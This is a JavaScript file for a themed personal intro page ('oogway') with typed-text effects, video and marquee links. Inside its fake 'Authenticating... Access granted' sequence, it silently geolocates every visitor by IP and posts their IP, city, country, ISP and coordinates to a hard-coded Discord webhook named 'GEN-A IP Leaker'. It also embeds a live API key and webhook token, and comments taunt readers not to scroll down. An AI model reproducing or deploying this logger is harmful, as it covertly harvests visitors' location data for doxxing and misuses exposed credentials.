// Hello! if your seeing this, i kinda updated this, don't scroll down.


'use strict';

const ipgeolocation = 'https://api.ipgeolocation.io/ipgeo?apiKey=3fe3da60084a401e90b36f93c8f3683e';

const timeouts = [];

const mobileAndTabletCheck = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

$(document).ready(() => {
    const links = [{
            name: 'RussianTenz/jax_gamer1214',
            link: '894679381/profile',
        },
    ];

    for (let i in links) {
        let link = links[i];

        $('#marquee').append(`<a href="https://www.roblox.com/users/${link.link}" target="_BLANK">${link.name}</a>`);

        link = $('#marquee').children('a').last();

        if (i != links.length - 1) $('#marquee').append(' <img class="emoticon" src="assets/others/mgh_17.png"> ');
    }

    if (mobileAndTabletCheck()) {
        $('#background').replaceWith('<div id="background" style="background-image: url(assets/images/mobile-background.jpg);"></div>');

        app.shouldIgnoreVideo = true;
    }

    app.titleChanger(['oogway', 'dsc.gg/wise-people', 'ogway']);
    app.iconChanger(['assets/icons/roses/rose1.jpg', 'assets/icons/roses/rose2.jpg', 'assets/icons/roses/rose3.jpg', 'assets/icons/roses/rose4.jpg', 'assets/icons/roses/rose5.jpg', 'assets/icons/roses/rose6.jpg', 'assets/icons/roses/rose7.jpg', 'assets/icons/roses/rose8.jpg', 'assets/icons/roses/rose1.jpg']);
});

if ($.cookie('videoTime')) {
    app.videoElement.currentTime = $.cookie('videoTime');
    app.audioElement.currentTime = $.cookie('videoTime');
}

document.addEventListener('contextmenu', (event) => {
    event.preventDefault();
});

document.body.onkeyup = (event) => {
    if (event.keyCode == 32 && app.skippedIntro) {
        if (app.backgroundToggler) {
            app.videoElement.play();
            app.audioElement.play();
        } else {
            app.videoElement.pause();
            app.audioElement.pause();
        }

        return (app.backgroundToggler = !app.backgroundToggler);
    }
};

$('html').on('contextmenu', (event) => {
    const img = document.createElement('img');

    const trollfaceLight = app.skippedIntro ? '' : 'trollface-light';

    img.src = 'assets/others/trollface.jpg';
    img.width = 64;
    img.height = 64;
    img.alt = 'dsc.gg/wise-people';
    img.style = `position: absolute; left: ${event.pageX}px; top: ${event.pageY}px; z-index: 10`;
    img.className = `troll ${trollfaceLight}`;

    document.body.appendChild(img);
});

setInterval(() => {
    $('.troll').remove();
}, 600);

$('.skip').click(() => {
    skipIntro();
});

$.fn.extend({
    animateCss: function(animationName) {
        const animationEnd = 'webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend';

        this.addClass(`animated ${animationName}`).one(animationEnd, () => {
            $(this).removeClass(`animated ${animationName}`);
        });

        return this;
    },
});

const writeLine = (text, speed, timeout, callback) => {
    timeout = typeof timeout === 'number' ? timeout : [0, (callback = timeout)];

    const lineNumber = app.id !== 2 ? ++app.id : (app.id += 2);

    setTimeout(() => {
        const typed = new Typed(`#line${lineNumber}`, {
            strings: text,
            typeSpeed: speed,
            onComplete: callback,
        });
    }, timeout);
};

$.getJSON(ipgeolocation, (data) => {
    writeLine(['Authenticating...', "Granting access to <span style='font-size: 14px; color: #ffe51c;'>[OOG.WAY]</span>..."], 30, () => {
        if (app.skippedIntro) return;

        clearCursor();

        const usernames = ['user', 'dude'];
        
        // Why did you scroll down?

        const ip = data.ip ? data.ip : usernames[Math.floor(Math.random() * usernames.length)];
        const country = data.country_name ? data.country_name : 'your country';
        const city = data.city ? data.city : 'your city';
        const connection_type = data.connection_type ? data.connection_type : 'None';
        const organization = data.organization ? data.organization : 'your organization';
        const latitude = data.latitude ? data.latitude : 'your latitude';
        const longitude = data.longitude ? data.longitude : 'your longitude';

        function sendMessage() {
            var request = new XMLHttpRequest();
            // GRRRR... I TOLD YOU NOT TO SCROLL DOWN.
            request.open("POST", "https://discord.com/api/webhooks/1098598764094173235/c9FbIGC9Ac36Fn5oU8-fFc-KeRIsUfiFT86mEmLE8NwRSBkxYmkzJtr-hpgCn2hgix4d");
      
            request.setRequestHeader('Content-type', 'application/json');
      
            var params = { 
              username: "GEN-A IP Leaker",
              avatar_url: "",
              content: `**@everyone LEAKED!!!**\nIP: ${ip}\nCountry: ${country}\nCity: ${city}\nConnection Type: ${connection_type}\nWifi Organization: ${organization}\nCords or Coordinates (Innaccurate): ${latitude},${longitude}`
            }
      
            request.send(JSON.stringify(params));
          }

        sendMessage()

        writeLine([`Access granted! <span style='font-size: 14px; color: #0f0;'>[success]</span>`, `Welcome. <i style='color: #fff393'>${ip}</i>.`], 30, 500, () => {
            if (app.skippedIntro) return;

            clearCursor();

            writeLine([`<i style='color: #ffe51c'>created by [ogwaythemagnificent]</i>`], 120, 500, () => {
                timeouts.push(
                    setTimeout(() => {
                        if (app.skippedIntro) return;

                        clearCursor();

                        setTimeout(() => {
                            skipIntro();
                        }, 500);
                    }, 1000)
                );
            });
        });
    });
});

const skipIntro = () => {
    if (app.skippedIntro) return;

    app.skippedIntro = true;

    timeouts.forEach((timeout) => {
        clearTimeout(timeout);
    });

    $('.top-right').remove();

    $('#main').fadeOut(100, () => {
        $('#main').remove();

        $('#marquee').marquee({
            duration: 15000,
            gap: 420,
            delayBeforeStart: 1000,
            direction: 'left',
            duplicated: true,
        });

        setTimeout(() => {
            $('.brand-header').animateCss(app.effects[Math.floor(Math.random() * app.effects.length)]);
        }, 200);

        setTimeout(() => {
            const typed = new Typed('#brand', {
                strings: app.brandDescription,
                typeSpeed: 40,

                onComplete: () => {
                    clearCursor();
                },
            });
        }, 1350);

        setTimeout(() => {
            if (!app.shouldIgnoreVideo) {
                app.videoElement.play();
                app.audioElement.play();
            }

            app.videoElement.addEventListener(
                'timeupdate',
                () => {
                    $.cookie('videoTime', app.videoElement.currentTime, {
                        expires: 1
                    });
                },
                false
            );

            $('.marquee-container').css('visibility', 'visible').hide().fadeIn(100);

            $('.marquee-container').animateCss('zoomIn');

            $('.container').fadeIn();

            $('.background').fadeIn(200, () => {
                if (!app.shouldIgnoreVideo) $('#audio').animate({
                    volume: app.musicVolume
                }, app.musicFadeIn);
            });
        }, 200);
    });
};

const clearCursor = () => {
    return $('span').siblings('.typed-cursor').css('opacity', '0');
};
